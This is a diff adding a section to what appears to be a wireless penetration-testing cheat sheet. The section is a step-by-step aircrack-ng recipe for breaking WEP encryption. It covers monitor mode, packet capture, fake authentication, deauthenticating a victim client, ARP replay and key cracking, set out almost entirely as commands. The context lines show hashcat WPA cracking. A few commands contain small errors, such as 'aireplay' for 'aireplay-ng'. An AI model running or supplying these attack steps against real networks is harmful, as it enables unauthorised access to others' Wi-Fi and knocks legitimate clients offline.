@@ -35,3 +35,32 @@ HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 # hashcat64.exe -m 2500 cap.hccapx rockyou.txt -r rules\<rule> 
 ```
 
+### Cracking WEP with Open Authenitcation Clients
+
+```text
+########## Cracking WEP With Clients (open authentication) ########## 
+#enter monitor mode
+airmon-ng start wlan0 <AP Channel>
+
+#capture dump of target AP  
+airodump-ng -c <channel> --bssid <MAC> -w <file-name> wlan0
+
+#fake auth attack on AP
+aireplay-ng -1 0 -e <AP ESSID> -a <MAC AP> -h <wlan0 MAC> wlan0
+
+#fake auth attack on picky AP
+aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <wlan0 MAC> wlan0
+
+#deauth attack to get ARP packet of another client
+aireplay-ng -0 1 -a <AP MAC> -c <Victim MAC> wlan0
+
+#arp request replay attack
+aireplay-ng -3 -b <AP MAC> -h <wlan0 MAC> wlan0
+
+#deauth to speed up capture of IV/WEP Key
+aireplay -0 1 -a <AP MAC> -c <Victim MAC> wlan0
+
+#crack WEP Key
+aircrack-ng -0 <filename>
+```
+
